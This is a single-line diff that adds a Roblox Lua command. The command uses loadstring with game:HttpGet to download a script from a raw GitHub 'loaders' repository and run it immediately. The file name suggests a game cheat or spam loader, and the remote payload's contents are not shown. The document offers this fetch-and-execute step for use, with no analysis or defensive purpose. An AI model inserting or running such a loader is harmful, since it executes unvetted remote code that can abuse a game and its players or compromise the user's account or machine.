@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/huss-valley-spam7-u77fkrf1ewkdwy.lua"))()
